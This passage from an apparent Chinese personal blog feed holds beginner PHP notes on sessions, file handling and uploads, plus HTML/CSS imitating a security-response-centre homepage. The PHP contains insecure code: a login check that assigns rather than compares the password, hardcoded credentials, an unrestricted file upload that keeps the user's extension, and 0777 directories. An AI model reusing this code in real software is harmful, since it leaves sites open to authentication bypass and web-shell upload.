class="number">100</span>;</span><br><span class="line"></span><br><span class="line">	c($aa);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"aa = $aa"</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h1 id="PHP的会话技术操作"><a href="#PHP的会话技术操作" class="headerlink" title="PHP的会话技术操作"></a>PHP的会话技术操作</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">登陆页面 - 2.php</span><br><span class="line">    &lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">	&lt;title&gt;session登陆测试&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;1.php&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">	用户：&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;user&quot; &#x2F;&gt;</span><br><span class="line">	密码：&lt;input type&#x3D;&quot;password&quot; name&#x3D;&quot;pass&quot; &#x2F;&gt;</span><br><span class="line">	&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line">验证页面 - 1.php</span><br><span class="line">&lt;?php</span><br><span class="line">	header(&quot;Content-type:text&#x2F;html;charset&#x3D;utf-8&quot;);</span><br><span class="line">	session_start();</span><br><span class="line"></span><br><span class="line">	if(empty($_POST))&#123;</span><br><span class="line">		echo &quot;无法登陆&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">		echo &quot;&lt;a href&#x3D;&#39;2.php&#39;&gt;请登录&lt;&#x2F;a&gt;&quot;;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		$name &#x3D; $_POST[&quot;user&quot;];</span><br><span class="line">		$pass &#x3D; $_POST[&quot;pass&quot;];</span><br><span class="line"></span><br><span class="line">		if($name &#x3D;&#x3D; &quot;admin&quot; &amp;&amp; $pass &#x3D; &quot;123&quot;)&#123;</span><br><span class="line">			$_SESSION[&#39;name&#39;]&#x3D;&quot;admin&quot;;</span><br><span class="line">			header(&quot;location: 5.php&quot;);</span><br><span class="line">		&#125;else&#123;</span><br><span class="line">			echo &quot;用户名或密码错误&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">			echo &quot;&lt;a href&#x3D;&#39;2.php&#39;&gt;请登录&lt;&#x2F;a&gt;&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">登陆成功页面 - 5.php</span><br><span class="line">&lt;?php</span><br><span class="line">	header(&quot;Content-type:text&#x2F;html;charset&#x3D;utf-8&quot;);</span><br><span class="line">	session_start();</span><br><span class="line"></span><br><span class="line">	if(empty($_SESSION))&#123;</span><br><span class="line">		echo &quot;无权登陆&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">		echo &quot;&lt;a href&#x3D;&#39;2.php&#39;&gt;请登录&lt;&#x2F;a&gt;&quot;;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		$name &#x3D; $_SESSION[&quot;name&quot;];</span><br><span class="line">		echo &quot;欢迎 $name 登陆系统&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<h1 id="PHP的文件操作"><a href="#PHP的文件操作" class="headerlink" title="PHP的文件操作"></a>PHP的文件操作</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">- - index.php</span><br><span class="line">&lt;?php</span><br><span class="line">	header(&quot;Content-type:text&#x2F;html;charset&#x3D;utf-8&quot;);</span><br><span class="line">	&#x2F;&#x2F; &#x2F;&#x2F; 文件包含</span><br><span class="line">	&#x2F;&#x2F; &#x2F;&#x2F; require include require_once include_once</span><br><span class="line">	&#x2F;&#x2F; echo &quot;www.x.com&lt;hr&#x2F;&gt;&quot;;</span><br><span class="line">	&#x2F;&#x2F; require_once &quot;array.php&quot;;  &#x2F;&#x2F;include报错还是执行</span><br><span class="line">	&#x2F;&#x2F; &#x2F;&#x2F;require报错不执行</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; echo &quot;xxxx&lt;hr&#x2F;&gt;&quot;;</span><br><span class="line">	&#x2F;&#x2F; require_once &quot;array.php&quot;;</span><br><span class="line">	&#x2F;&#x2F; echo &quot;xxxx&lt;hr&#x2F;&gt;&quot;;</span><br><span class="line">	&#x2F;&#x2F; require_once &quot;array.php&quot;;  &#x2F;&#x2F;只执行一次</span><br><span class="line">	&#x2F;&#x2F; echo &quot;xxxx&lt;hr&#x2F;&gt;&quot;;</span><br><span class="line">	</span><br><span class="line">	&#x2F;&#x2F; echo realpath(&quot;..&#x2F;..&#x2F;&quot;); </span><br><span class="line">&#x2F;*</span><br><span class="line">	$fileNames &#x3D; opendir(&quot;.&quot;);  &#x2F;&#x2F;开文件夹</span><br><span class="line">	while($row  &#x3D; readdir($fileNames)) &#x2F;&#x2F;读文件</span><br><span class="line">	&#123;</span><br><span class="line">		echo $row.&quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	closedir($fileNames);</span><br><span class="line"></span><br><span class="line">	if(is_dir(&quot;2.php&quot;))&#123;</span><br><span class="line">		echo &quot;yes&quot;;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		echo &quot;no&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">*&#x2F;</span><br><span class="line">&#x2F;&#x2F;	unlink(&quot;12313.php&quot;); &#x2F;&#x2F;删除文件</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F;file_get_contents() &#x2F;&#x2F;读取内容 &#x2F;&#x2F;file_put_contents写入内容</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; $str &#x3D; file_get_contents(&quot;array.php&quot;);</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; var_dump($str);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;递归技巧</span><br><span class="line"></span><br><span class="line">	&#x2F;*</span><br><span class="line">	$path 目录</span><br><span class="line">	$lev 层级 进入一层，目录更深，明显显示出来</span><br><span class="line">	*&#x2F;</span><br><span class="line">	function showDir($path, $lev&#x3D;0)&#123;</span><br><span class="line">		$fh &#x3D; opendir($path);</span><br><span class="line">		while($row &#x3D; readdir($fh))&#123;</span><br><span class="line">			&#x2F;&#x2F;如果目录为.和..就跳过</span><br><span class="line">			if(($row &#x3D;&#x3D; &#39;.&#39;) || ($row &#x3D;&#x3D; &#39;..&#39;))&#123;</span><br><span class="line">				continue;</span><br><span class="line">			&#125;</span><br><span class="line">			echo str_repeat(&quot;$nbsp;$nbsp;&quot;, $lev),$row,&#39;&lt;br &#x2F;&gt;&#39;;</span><br><span class="line">			&#x2F;&#x2F;如果目录里还有目录，继续往下读目录</span><br><span class="line">			if(is_dir($path.&#39;&#x2F;&#39;.$row))&#123;</span><br><span class="line">				showdir($path.&#39;&#x2F;&#39;.$row,$lev+1);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		closedir($fh);</span><br><span class="line">	&#125;</span><br><span class="line">	showDir(&#39;..&#39;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">-- array.php</span><br><span class="line">&lt;?php</span><br><span class="line">	header(&quot;Content-type:text&#x2F;html;charset&#x3D;utf-8&quot;);</span><br><span class="line">	&#x2F;&#x2F; var_dump($_FILES);</span><br><span class="line">	if(empty($_FILES))&#123;</span><br><span class="line">		echo &quot;请上传文件&quot;;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		&#x2F;&#x2F; echo $_FILES[&#39;pic&#39;][&#39;name&#39;].&quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">		&#x2F;&#x2F; echo $_FILES[&#39;pic&#39;][&#39;tmp_name&#39;].&quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">		define(&quot;PATH&quot;,__DIR__);</span><br><span class="line">		$path &#x3D; PATH.&quot;&#x2F;&quot;.&quot;upload&quot;.&quot;&#x2F;images&quot;;</span><br><span class="line">		$dir1 &#x3D; date(&quot;Ym&quot;);</span><br><span class="line">		$dir2 &#x3D; date(&quot;d&quot;);</span><br><span class="line">		$fullPath &#x3D; $path.&quot;&#x2F;&quot;.$dir1.&quot;&#x2F;&quot;.$dir2;</span><br><span class="line">		if(is_dir($fullPath))</span><br><span class="line">		&#123;</span><br><span class="line">			echo &quot;yes&quot;;</span><br><span class="line">		&#125;else&#123;</span><br><span class="line">			&#x2F;&#x2F;echo &quot;no&quot;;</span><br><span class="line">			mkdir($fullPath,0777,true);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		$fileName &#x3D; rand(100000,999999);</span><br><span class="line">		$fileType &#x3D; strrchr($_FILES[&#39;pic&#39;][&#39;name&#39;], &quot;.&quot;);</span><br><span class="line">		$fileName &#x3D; $fileName.$fileType;</span><br><span class="line"></span><br><span class="line">		move_uploaded_file($_FILES[&#39;pic&#39;][&#39;tmp_name&#39;], $fullPath.&quot;&#x2F;&quot;.$fileName);</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">- -3.php</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">	&lt;title&gt;测试文件上传&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action&#x3D;&quot;array.php&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">	&lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;pic&quot; &#x2F;&gt;</span><br><span class="line">	&lt;input type&#x3D;&quot;submit&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line">-- 4.php</span><br><span class="line">&lt;?php</span><br><span class="line">	&#x2F;&#x2F;D:\phpstudy pro\WWW</span><br><span class="line">	&#x2F;&#x2F;echo __DIR__.&quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">	&#x2F;&#x2F;D:\phpstudy pro</span><br><span class="line">	&#x2F;&#x2F;echo dirname(__DIR__);</span><br><span class="line">	define(&quot;PATH&quot;,__DIR__);</span><br><span class="line">	$path &#x3D; PATH.&quot;&#x2F;&quot;.&quot;upload&quot;.&quot;&#x2F;images&quot;;</span><br><span class="line">	$dir1 &#x3D; date(&quot;Ym&quot;);</span><br><span class="line">	$dir2 &#x3D; date(&quot;d&quot;);</span><br><span class="line">	$fullPath &#x3D; $path.&quot;&#x2F;&quot;.$dir1.&quot;&#x2F;&quot;.$dir2;</span><br><span class="line">	if(is_dir($fullPath))</span><br><span class="line">	&#123;</span><br><span class="line">		echo &quot;yes&quot;;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		&#x2F;&#x2F;echo &quot;no&quot;;</span><br><span class="line">		mkdir($fullPath,0777,true);</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">- - 6.php</span><br><span class="line">&lt;?php</span><br><span class="line">	$a&#x3D;1;</span><br><span class="line">	$b&#x3D;2;</span><br><span class="line">	$fh &#x3D; opendir(&#39;..&#39;);</span><br><span class="line">	while($row &#x3D; readdir($fh))</span><br><span class="line">			&#123;</span><br><span class="line">				echo $row.&quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">			&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>



<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>【HTML】实战阿里云src页面css模仿基础学习</title>
    <url>/2021/07/13/%E3%80%90HTML%E3%80%91%E5%AE%9E%E6%88%98%E9%98%BF%E9%87%8C%E4%BA%91src%E9%A1%B5%E9%9D%A2css%E6%A8%A1%E4%BB%BF%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="实战结果页面gif图片"><a href="#实战结果页面gif图片" class="headerlink" title="实战结果页面gif图片"></a>实战结果页面gif图片</h1><p>去我博客园看：<a href="https://www.cnblogs.com/GYLQ/p/15004744.html" target="_blank" rel="noopener">https://www.cnblogs.com/GYLQ/p/15004744.html</a></p>
<h2 id="阿里云src首页模仿完整代码（500行左右）"><a href="#阿里云src首页模仿完整代码（500行左右）" class="headerlink" title="阿里云src首页模仿完整代码（500行左右）"></a>阿里云src首页模仿完整代码（500行左右）</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span>  <span class="comment">&lt;!--字符集 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>阿里安全响应中心<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">	*&#123;</span><br><span class="line">		padding: 0px;</span><br><span class="line">		margin: 0px;</span><br><span class="line">	&#125;</span><br><span class="line">		body&#123;</span><br><span class="line">			font-family: Helvetica Neue For Number,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Helvetica Neue,Helvetica,Arial,sans-serif;;</span><br><span class="line">			font-size: 13px;</span><br><span class="line"><span class="css">			<span class="selector-tag">background-color</span>: <span class="selector-id">#fff</span>;</span></span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.login-box</span>&#123;</span></span><br><span class="line"><span class="css">			<span class="selector-tag">background-color</span>: <span class="selector-id">#ededed</span>;</span></span><br><span class="line">			height: 34px;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.login-content</span>&#123;</span></span><br><span class="line">			margin-right: 120px;</span><br><span class="line">			text-align: right;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.login-content</span> <span class="selector-tag">span</span> <span class="selector-tag">a</span>&#123;</span></span><br><span class="line">			text-decoration: none;</span><br><span class="line"><span class="css">			<span class="selector-tag">color</span>: <span class="selector-id">#000</span>;</span></span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.login-content</span> <span class="selector-tag">span</span>&#123;</span></span><br><span class="line">			line-height: 34px;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.change-lange</span>&#123;</span></span><br><span class="line"><span class="css">			<span class="selector-tag">color</span>: <span class="selector-id">#000000</span>;</span></span><br><span class="line">			text-decoration: none;</span><br><span class="line"><span class="css">			<span class="selector-tag">border</span>: 1<span class="selector-tag">px</span> <span class="selector-tag">solid</span> <span class="selector-id">#999</span>;</span></span><br><span class="line">			border-radius: 3px;</span><br><span class="line">			padding: 0px 10px;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.change-lange</span><span class="selector-pseudo">:hover</span>&#123;</span></span><br><span class="line"><span class="css">			<span class="selector-tag">color</span>: <span class="selector-id">#FFF</span>;</span></span><br><span class="line"><span class="css">			<span class="selector-tag">background-color</span>: <span class="selector-id">#108ee9</span>;</span></span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.logo</span>&#123;</span></span><br><span class="line">			float: left;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.logo</span> <span class="selector-tag">img</span>&#123;</span></span><br><span class="line">			margin-left: 70px;</span><br><span class="line">			margin-top: 10px;</span><br><span class="line">			width: 139px;</span><br><span class="line">			height: 45px;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.first-menu</span> <span class="selector-tag">li</span> <span class="selector-tag">a</span>&#123;</span></span><br><span class="line"><span class="css">			<span class="selector-tag">color</span>: <span class="selector-id">#000000</span>;</span></span><br><span class="line">			text-decoration: none;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.first-menu</span>&#123;</span></span><br><span class="line">			font-size: 16px;</span><br><span class="line">			list-style: none;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.first-menu</span> <span class="selector-tag">li</span>&#123;</span></span><br><span class="line">			line-height: 70px;</span><br><span class="line">			padding: 0px 16px;</span><br><span class="line">			float: left;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.first-menu</span> <span class="selector-tag">li</span><span class="selector-pseudo">:hover</span>&#123;</span></span><br><span class="line"><span class="css">			<span class="selector-tag">border-bottom</span>: 1<span class="selector-tag">px</span> <span class="selector-tag">solid</span> <span class="selector-id">#108ee9</span>;</span></span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.nav</span>&#123;</span></span><br><span class="line">			height: 70px;</span><br><span class="line"><span class="css">			<span class="selector-tag">border-bottom</span>: 1<span class="selector-tag">px</span> <span class="selector-tag">solid</span> <span class="selector-id">#dede</span>;</span></span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.submit-LAI</span>&#123;</span></span><br><span class="line">			float: right;</span><br><span class="line">			line-height: 70px;</span><br><span class="line">			margin-right: 120px;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.submit-LAI</span> <span class="selector-tag">div</span>&#123;</span></span><br><span class="line"><span class="css">			<span class="selector-tag">background</span>: <span class="selector-id">#008aff</span>;</span></span><br><span class="line">    		padding-left: 15px;</span><br><span class="line">    		padding-right: 15px;</span><br><span class="line">   			height: 46px;</span><br><span class="line">   		 	line-height: 46px;</span><br><span class="line">   	 		display: inline-block;</span><br><span class="line">   			margin-top: 12px;</span><br><span class="line"><span class="css">   			<span class="selector-tag">color</span>: <span class="selector-id">#fff</span>;</span></span><br><span class="line">   		 	text-align: center;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.cl</span>&#123;</span></span><br><span class="line">			clear: both;</span><br><span class="line">			padding-bottom: 3px;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.home-page</span>&#123;</span></span><br><span class="line">			text-align: center;</span><br><span class="line"><span class="css">   			<span class="selector-tag">background</span>: <span class="selector-id">#000f1c</span>;</span></span><br><span class="line"><span class="css">    		<span class="selector-tag">background</span>: <span class="selector-tag">linear-gradient</span>(75<span class="selector-tag">deg</span>,<span class="selector-id">#000b14</span>,<span class="selector-id">#00213c</span>);</span></span><br><span class="line">    		position: relative;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.home-page</span> <span class="selector-tag">img</span>&#123;</span></span><br><span class="line">			max-width: 1440px;</span><br><span class="line">			width: 100%;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.sub-vulnerability</span> <span class="selector-tag">a</span>&#123;</span></span><br><span class="line">			display: block;</span><br><span class="line">			width: 100px;</span><br><span class="line"><span class="css">			<span class="selector-tag">border</span>: 1<span class="selector-tag">px</span> <span class="selector-tag">solid</span> <span class="selector-id">#aaa</span>;</span></span><br><span class="line">			text-decoration: none;</span><br><span class="line"><span class="css">			<span class="selector-tag">color</span>: <span class="selector-id">#aaa</span>;</span></span><br><span class="line">			text-align: center;</span><br><span class="line">			padding: 10px;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.sub-vulnerability</span> <span class="selector-tag">a</span><span class="selector-pseudo">:hover</span>&#123;</span></span><br><span class="line"><span class="css">			<span class="selector-tag">background</span>: <span class="selector-id">#108ee9</span>;</span></span><br><span class="line"><span class="css">    		<span class="selector-tag">color</span>: <span class="selector-id">#fff</span>;</span></span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.sub-vulnerability</span>&#123;</span></span><br><span class="line">			position: absolute;</span><br><span class="line">			top: 60%;</span><br><span class="line">			left: 12%;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.tips</span>&#123;</span></span><br><span class="line"><span class="css">			<span class="selector-tag">background</span>: <span class="selector-id">#7a7a7a</span>;</span></span><br><span class="line">			height: 45px;</span><br><span class="line"><span class="css">			<span class="selector-tag">color</span>: <span class="selector-id">#000f1c</span>;</span></span><br><span class="line">			font-size: 14px;</span><br><span class="line">			margin-bottom: 30px;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.tips</span> <span class="selector-tag">span</span> <span class="selector-tag">a</span>&#123;</span></span><br><span class="line">			text-decoration: none;</span><br><span class="line">			line-height: 45px;</span><br><span class="line"><span class="css">			<span class="selector-tag">color</span>: <span class="selector-id">#000f1c</span>;</span></span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.tips</span> <span class="selector-tag">span</span>&#123;</span></span><br><span class="line">			display: inline-block;</span><br><span class="line">			width: 300px;</span><br><span class="line">			text-align: center;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.main-left</span>&#123;</span></span><br><span class="line">			width: 900px;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.security-title</span>&#123;</span></span><br><span class="line"><span class="css">			<span class="selector-tag">border-bottom</span>: 1<span class="selector-tag">px</span> <span class="selector-tag">solid</span> <span class="selector-id">#dedede</span>;</span></span><br><span class="line">			height: 40px;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.security-title</span> <span class="selector-tag">h3</span>&#123;</span></span><br><span class="line">			font-weight: normal;</span><br><span class="line">			float: left;</span><br><span class="line">			font-size: 18px;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.security-title</span> <span class="selector-tag">h4</span>&#123;</span></span><br><span class="line">			font-weight: normal;</span><br><span class="line">			float: right;</span><br><span class="line">			font-size: 14px;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.security-title</span> <span class="selector-tag">a</span>&#123;</span></span><br><span class="line"><span class="css">			<span class="selector-tag">color</span>: <span class="selector-id">#008aff</span>;</span></span><br><span class="line">			text-decoration: none;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.main-box</span>&#123;</span></span><br><span class="line">			margin: 0px 35px;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.logs</span>&#123;</span></span><br><span class="line">			clear: both;</span><br><span class="line">			padding-top: 20px;</span><br><span class="line">			height: 180px;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.logs</span> <span class="selector-tag">img</span>&#123;</span></span><br><span class="line">			float: left;</span><br><span class="line">			width: 216px;</span><br><span class="line">			height: 162px;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.logs-title</span>&#123;</span></span><br><span class="line">			height: 120px;</span><br><span class="line">			width: 600px;</span><br><span class="line">			padding: 20px 5px;</span><br><span class="line">			</span><br><span class="line">			float: left;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.logs-title</span><span class="selector-pseudo">:hover</span>&#123;</span></span><br><span class="line"><span class="css">			<span class="selector-tag">box-shadow</span>: 1<span class="selector-tag">px</span> 1<span class="selector-tag">px</span> 1<span class="selector-tag">px</span> <span class="selector-id">#999</span>;</span></span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.logs-title</span> <span class="selector-tag">a</span>&#123;</span></span><br><span class="line">			font-size: 20px;</span><br><span class="line"><span class="css">			<span class="selector-tag">color</span>: <span class="selector-id">#000</span>;</span></span><br><span class="line">			text-decoration: none;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.logs-data</span>,<span class="selector-class">.logs-keywords</span>&#123;</span></span><br><span class="line">			display: block;</span><br><span class="line">			clear: both;</span><br><span class="line">			font-size: 12px;</span><br><span class="line">			margin-top: 20px;</span><br><span class="line"><span class="css">			<span class="selector-tag">color</span>: <span class="selector-id">#73808c</span>;</span></span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.logs-keywords</span>&#123;</span></span><br><span class="line"><span class="css">			<span class="selector-tag">color</span>: <span class="selector-id">#999</span>;</span></span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.border-logs</span>&#123;</span></span><br><span class="line">			clear: both;</span><br><span class="line"><span class="css">			<span class="selector-tag">border-bottom</span>: 1<span class="selector-tag">px</span> <span class="selector-tag">solid</span> <span class="selector-id">#dedede</span>;</span></span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.list</span>&#123;</span></span><br><span class="line">			margin-top: 20px;</span><br><span class="line">			margin: 20px 5px 0px 5px;</span><br><span class="line">			float: left;</span><br><span class="line">			width: 290px;</span><br><span class="line">			height: 215px;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.list</span> <span class="selector-tag">img</span>&#123;</span></span><br><span class="line">			width: 227px;</span><br><span class="line">			height: 145px;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.name</span>&#123;</span></span><br><span class="line">			font-size: 20px;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.list</span><span class="selector-pseudo">:hover</span>&#123;</span></span><br><span class="line"><span class="css">			<span class="selector-tag">box-shadow</span>: 1<span class="selector-tag">px</span> 1<span class="selector-tag">px</span> 1<span class="selector-tag">px</span> <span class="selector-id">#dedede</span>;</span></span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.main-left</span>,<span class="selector-class">.main-right</span>&#123;</span></span><br><span class="line">			float: left;</span><br><span class="line">			margin-left: 90px;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.main-right</span>&#123;</span></span><br><span class="line">			margin-left: 20px;</span><br><span class="line">			width: 400px;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.list-tips</span>&#123;</span></span><br><span class="line">			margin: 15px 0px 20px 0px;</span><br><span class="line">			list-style: none;</span><br><span class="line">			line-height: 30px;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.list-tips</span> <span class="selector-tag">li</span> <span class="selector-tag">a</span>&#123;</span></span><br><span class="line">			text-decoration: none;</span><br><span class="line"><span class="css">			<span class="selector-tag">color</span>: <span class="selector-id">#666</span>;</span></span><br><span class="line">			font-size: 14px;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.list-tips-date</span>&#123;</span></span><br><span class="line">			float: right;</span><br><span class="line"><span class="css">			<span class="selector-tag">color</span>: <span class="selector-id">#999</span>;</span></span><br><span class="line">			font-size: 12px;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.src-table</span>&#123;</span></span><br><span class="line">			border-spacing: 0;</span><br><span class="line">			font-size: 12px;</span><br><span class="line">			width: 400px;</span><br><span class="line">			text-align: left;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.src-table</span> <span class="selector-tag">tr</span>&gt;<span class="selector-tag">th</span>&#123;</span></span><br><span class="line">			font-weight: normal;</span><br><span class="line"><span class="css">			<span class="selector-tag">background</span>: <span class="selector-id">#f1f1f1</span>;</span></span><br><span class="line">			padding: 16px 8px;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="css">		<span class="selector-class">.src-table</span> <span class="selector-tag">tr</span>&gt;<span class="selector-tag">td</span>&#123;</span></span><br><span class="line">			padding: 16px 8px;</span><br><span class="line"><span class="css">			<span class="selector-tag">border-bottom</span>: 1<span class="selector-tag">px</span> <span 